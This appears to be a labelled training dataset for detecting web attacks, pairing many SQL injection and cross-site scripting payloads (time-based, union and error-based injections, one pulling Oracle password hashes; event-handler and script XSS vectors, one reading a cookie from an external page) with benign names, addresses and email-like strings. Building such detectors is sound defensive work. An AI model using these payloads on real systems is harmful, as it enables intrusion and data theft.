payload,type
"1  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  6690  =  6690",sqli
segura reygadas,benign
" select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",sqli
"<style>@keyframes slidein {}</style><xmp style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></xmp>",xss
"<style>@keyframes x{}</style><menuitem style=""animation-name:x"" onanimationend=""alert(1)""></menuitem>",xss
"-7528' or make_set  (  3809  =  1821,1821  )   and 'kgch'  =  'kgch",sqli
37748,benign
"grupo fuensanta 197, 12?a",benign
"1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",sqli
'%20or%201=1,sqli
48042322z,benign
1'   )    )     )   rlike sleep  (  5  )  #,sqli
"""><iframe%20src=""http://google.com""%%203E",xss
"<div draggable=""true"" contenteditable>drag me</div><p ondragover=alert(1) contenteditable>drop here</p>",xss
"1'||  (  select 'jpow' from dual where 4381  =  4381 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",sqli
"<style>:target {transform: rotate(180deg);}</style><plaintext id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></plaintext>",xss
"<div draggable=""true"" contenteditable>drag me</div><object ondrop=alert(1) contenteditable>drop here</object>",xss
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",sqli
"<pre onkeyup=""alert(1)"" contenteditable>test</pre>",xss
begues,benign
"1%""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sqli
select case when 5559  =  3483 then 1 else null end--,sqli
braschi_courtneidge@djbroadcast.an,benign
"1  )   union all select null,null,null,null,null,null,null,null,null--",sqli
"<div draggable=""true"" contenteditable>drag me</div><a ondrop=alert(1) contenteditable>drop here</a>",xss
"1  )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sqli
cauthen3,benign
"<dd draggable=""true"" ondragstart=""alert(1)"">test</dd>",xss
62258107m,benign
"<div id=""138""><link rel=""import"" href=""test.svg"" />//[""'`-->]]>]</div><div id=""139""><iframe srcdoc=""&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;"" />//[""'`-->]]>]</div>undefined",xss
"<code draggable=""true"" ondragleave=""alert(1)"">test</code>",xss
"<div id=""115""><!--[if]><script>alert(115)</script -->",xss
" select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",sqli
<input type=radio id=x onfocusin=alert(1)>,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><s id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></s>",xss
<shadow id=x tabindex=1 onfocusin=alert(1)></shadow>,xss
"<figcaption draggable=""true"" ondragstart=""alert(1)"">test</figcaption>",xss
nahid,benign
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",sqli
"1""  )   where 6018  =  6018 and 7533  =  7533--",sqli
47172,benign
6252,benign
"<style>@keyframes slidein {}</style><menuitem style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></menuitem>",xss
"<rtc onkeydown=""alert(1)"" contenteditable>test</rtc>",xss
"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""oxvw""  =  ""oxvw",sqli
anda matamalas,benign
"<textarea onclick=""alert(1)"">test</textarea>",xss
correccionalmente,benign
"<image xmlns:xlink=""http://www.w3.org/1999/xlink"">",xss
16856,benign
1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'czqk' like 'czqk,sqli
1'   )    )    as xpmy where 5274  =  5274 rlike   (  select   (  case when   (  6252  =  7704  )   then 1 else 0x28 end   )    )   --,sqli
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- ",sqli
"1%""   )    )    waitfor delay '0:0:5' and    (    (   ""%""  =  """,sqli
"<set attributeName=""xlink:href"" begin=""accessKey(b)"" to=""//example.com/?b"" />",xss
" select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",sqli
<dfn id=x tabindex=1 onbeforeactivate=alert(1)></dfn>,xss
argentino,benign
"<dir onmouseup=""alert(1)"">test</dir>",xss
<time id=x tabindex=1 onfocusin=alert(1)></time>,xss
"<form draggable=""true"" ondragend=""alert(1)"">test</form>",xss
"<script>function x(window) { eval(location.hash.substr(1)) }; open(%22javascript:opener.x(window)%22)</script>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",xss
<basefont id=x tabindex=1 onfocus=alert(1)></basefont>,xss
"1 union all select null,null,null#",sqli
"benchmark(10000000,MD5(1))#",sqli
79144797a,benign
gaviota 13,benign
"<wbr onmousemove=""alert(1)"">test</wbr>",xss
71648159p,benign
amedee@spainbb.cc,benign
19185,benign
'OR 1=1--,sqli
"<style>:target {color:red;}</style><table id=x style=""transition:color 1s"" ontransitionend=alert(1)></table>",xss
1'+  (  select iwbs where 4939  =  4939,sqli
potroso,benign
"<BR SIZE=""&{alert('XSS')}"">",xss
"c/ cardenal cisneros 58,",benign
" select * from users where id  =  '1' union select \.#,@@VERSION -- 1'",sqli
"1 where 3799  =  3799 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",sqli
tindall-bourne@pintandomucho.cg,benign
1' where 6913  =  6913 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,sqli
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",sqli
<button onblur=alert(1) id=x></button><input autofocus>,xss
"<style>@keyframes x{}</style><option style=""animation-name:x"" onanimationend=""alert(1)""></option>",xss
"<abbr onclick=""alert(1)"">test</abbr>",xss
""" or true--",sqli
"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",sqli
<script onblur=alert(1) tabindex=1 id=x></script><input autofocus>,xss
huertas acosa,benign
"1"" where 1051  =  1051 union all select null--",sqli
"<em onbeforecut=""alert(1)"" contenteditable>test</em>",xss
" ORDER BY 1,SLEEP(5)#",sqli
"'),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sqli
gallinero de cameros,benign
18898337l,benign
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><pre id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></pre>",xss
"<section oncut=""alert(1)"" contenteditable>test</section>",xss
7.77E+15,benign
fortuny goyenaga,benign
a7av5nc6,benign
<title id=x tabindex=1 onfocus=alert(1)></title>,xss
"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli
"<tr oncopy=""alert(1)"" contenteditable>test</tr>",xss
"<style>@keyframes x{}</style><ins style=""animation-name:x"" onanimationend=""alert(1)""></ins>",xss
"<div draggable=""true"" contenteditable>drag me</div><details ondrop=alert(1) contenteditable>drop here</details>",xss
"<blockquote draggable=""true"" ondragenter=""alert(1)"">test</blockquote>",xss
"<wbr ondblclick=""alert(1)"">test</wbr>",xss
isidro,benign
"<style>@keyframes x{}</style><figcaption style=""animation-name:x"" onanimationend=""alert(1)""></figcaption>",xss
norberto,benign
"<style>@keyframes x{}</style><image style=""animation-name:x"" onanimationend=""alert(1)""></image>",xss
" select * from users where id  =  1 or 1#""1 union select 1,version  (    )   -- 1",sqli
"1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#",sqli
1 uni/**/on select all from where,sqli
"<div id=""44""><style>*[{}@import'test.css?]{color: green;}</style>X//[""'`-->]]>]</div><div id=""45""><div style=""font-family:'foo[a];color:red;';"">XXX</div>//[""'`-->]]>]</div><div id=""46""><div style=""font-family:foo}color=red;"">XXX</div>//[""'`-->]]>]</div><div id=""47""><svg xmlns=""http://www.w3.org/2000/svg""><script>alert(47)</script></svg>//[""'`-->]]>]</div><div id=""48""><SCRIPT FOR=document EVENT=onreadystatechange>alert(48)</SCRIPT>//[""'`-->]]>]</div><div id=""49""><OBJECT CLASSID=""clsid:333C7BC4-460F-11D0-BC04-0080C7055A83""><PARAM NAME=""DataURL"" VALUE=""javascript:alert(49)""></OBJECT>//[""'`-->]]>]</div><div id=""50""><object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""></object>//[""'`-->]]>]</div><div id=""51""><embed src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""></embed>//[""'`-->]]>]</div><div id=""52""><x style=""behavior:url(test.sct)"">//[""'`-->]]>]</div>",xss
"<fieldset oncut=""alert(1)"" contenteditable>test</fieldset>",xss
"<select draggable=""true"" ondragleave=""alert(1)"">test</select>",xss
select   (  case when   (  7217  =  7631  )   then 7217 else 7217*  (  select 7217 from information_schema.character_sets  )   end  )  #,sqli
necforo,benign
<audio id=x tabindex=1 onactivate=alert(1)></audio>,xss
<sVg oNloaD=write()>,xss
"1""  )   where 7723  =  7723 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",sqli
fiset,benign
 or '1'  =  '1,sqli
"1"" union all select null,null,null,null#",sqli
"calle morse, 17",benign
if  (  1087  =  5839  )   select 1087 else drop function zzeh--,sqli
brihuega,benign
"-3462   )    )    as biyl where 5143  =  5143 union all select 5143,5143,5143--",sqli
"<aside onmouseup=""alert(1)"">test</aside>",xss
"1%"" and 9198  =  9198--",sqli
"1'  )   as uqkz where 8482  =  8482 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sqli
"<style>@keyframes x{}</style><br style=""animation-name:x"" onanimationend=""alert(1)""></br>",xss
yasna,benign
<ul onblur=alert(1) tabindex=1 id=x></ul><input autofocus>,xss
6991,benign
1'   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'nuis'  =  'nuis,sqli
"make_set  (  7729  =  7729,1  )  ",sqli
" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",sqli
<ul id=x tabindex=1 onfocusin=alert(1)></ul>,xss
<em id=x tabindex=1 ondeactivate=alert(1)></em><input id=y autofocus>,xss
campanini-adamson@barebackspain.kh,benign
"<set attributeName=""onmouseover"" to=""alert(89)""/>",xss
or a   =   a,sqli
warriner,benign
valbuena de duero,benign
"-5903%""   )    )     )   or 3038  =  3038",sqli
nazareno,benign
clodettes_pierson@repretexbcn.ml,benign
47419,benign
<rp onfocusout=alert(1) tabindex=1 id=x></rp><input autofocus>,xss
canut escriba,benign
? or 1  =  1 --,sqli
"1   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  6583  =  6583",sqli
16154,benign
"<style>:target {color: red;}</style><content id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></content>",xss
"-4772   )    )     )   union all select 3879,3879,3879,3879,3879--",sqli
<dt id=x tabindex=1 onfocus=alert(1)></dt>,xss
capaz9,benign
"<style>@keyframes x{}</style><hr style=""animation-name:x"" onanimationend=""alert(1)""></hr>",xss
5.51E+15,benign
el taxista 199 10?c,benign
"<style>:target {color:red;}</style><optgroup id=x style=""transition:color 1s"" ontransitionend=alert(1)></optgroup>",xss
leiding@ubuybetter.cat,benign
"escritor nicolas del paso, 95",benign
"<title onbeforecopy=""alert(1)"" contenteditable>test</title>",xss
"<font draggable=""true"" ondragleave=""alert(1)"">test</font>",xss
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9",sqli
"<big onmouseout=""alert(1)"">test</big>",xss
59760678p,benign
calle horreo 85 10?d,benign
"<body onkeypress=""alert(1)"" contenteditable>test</body>",xss
96639593x,benign
gunther@nik.com.tn,benign
22120,benign
myers@naturalchild.so,benign
14973109v,benign
"<td onmouseout=""alert(1)"">test</td>",xss
tornadizos de vila,benign
es3regamiento,benign
montoro,benign
"1"" where 3227  =  3227 waitfor delay '0:0:5'--",sqli
demetrio,benign
"<style>@keyframes slidein {}</style><samp style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></samp>",xss
""" or 1  =  1--",sqli
admin' or '1'  =  '1'--,sqli
 ORDER BY 4-- ,sqli
<body id=x tabindex=1 onfocus=alert(1)></body>,xss
end and   (  'nchh'  =  'nchh,sqli
"<style>:target {transform: rotate(180deg);}</style><dl id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></dl>",xss
poblacin de arroyo,benign
pa24dan3cea,benign
"<sub onkeyup=""alert(1)"" contenteditable>test</sub>",xss
1'   )    )    and 3814  =  4272--,sqli
calle arins 87 4?e,benign
"1 union all select null,null,null,null,null,null,null#",sqli
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli
rei1@rtce.au,benign
-4761 order by 1--,sqli
"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""thkh"" like ""thkh",sqli
"<shadow oncopy=""alert(1)"" contenteditable>test</shadow>",xss
"<style>@keyframes x{}</style><optgroup style=""animation-name:x"" onanimationstart=""alert(1)""></optgroup>",xss
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND 'i'  =  'i,sqli
vilaller,benign
"<svg oncut=""alert(1)"" contenteditable>test</svg>",xss
<blink id=x tabindex=1 onbeforedeactivate=alert(1)></blink><input autofocus>,xss
bosch linares,benign
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",sqli
(sqlvuln),sqli
" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16",sqli
jaspe ochoa,benign
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",sqli
<q onfocusout=alert(1) tabindex=1 id=x></q><input autofocus>,xss
geli febo,benign
"<dfn onbeforecut=""alert(1)"" contenteditable>test</dfn>",xss
"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",sqli
orion,benign
select * from users where id  =  1 <@. or 1  =  1 -- 1,sqli
",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sqli
"<style>@keyframes slidein {}</style><strong style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></strong>",xss
"-2726""   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   ""ococ""  =  ""ococ",sqli
 ORDER BY 23 ,sqli
"<fieldset onbeforecut=""alert(1)"" contenteditable>test</fieldset>",xss
<article id=x tabindex=1 onbeforedeactivate=alert(1)></article><input autofocus>,xss
"<samp onkeypress=""alert(1)"" contenteditable>test</samp>",xss
massimil,benign
"<dfn draggable=""true"" ondragenter=""alert(1)"">test</dfn>",xss
"<style>@keyframes slidein {}</style><header style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></header>",xss
"<LINK REL=""stylesheet"" HREF=""http://ha.ckers.org/xss.css"">",xss
"1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",sqli
"<style>:target {color:red;}</style><tbody id=x style=""transition:color 1s"" ontransitionend=alert(1)></tbody>",xss
1 or sleep  (  __TIME__  )  #,sqli
<shadow id=x tabindex=1 onbeforeactivate=alert(1)></shadow>,xss
"1 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- mtaq",sqli
"<figcaption onkeyup=""alert(1)"" contenteditable>test</figcaption>",xss
"-6611%""   )    )     )   union all select 8918,8918#",sqli
2417,benign
alfonso.julissa@naturalchild.tk,benign
"<![><img src=""]><img src=x onerror=alert(39)//"">",xss
alienacin,benign
95937804c,benign
"<img onpaste=""alert(1)"" contenteditable>test</img>",xss
7.76E+15,benign
1 and 9412  =  6877#,sqli
mariabel,benign
select   (  case when   (  3863  =  1151  )   then 3863 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,sqli
jaazael,benign
"<i onbeforecopy=""alert(1)"" contenteditable>test</i>",xss
"<u draggable=""true"" ondragenter=""alert(1)"">test</u>",xss
"<canvas onmouseup=""alert(1)"">test</canvas>",xss
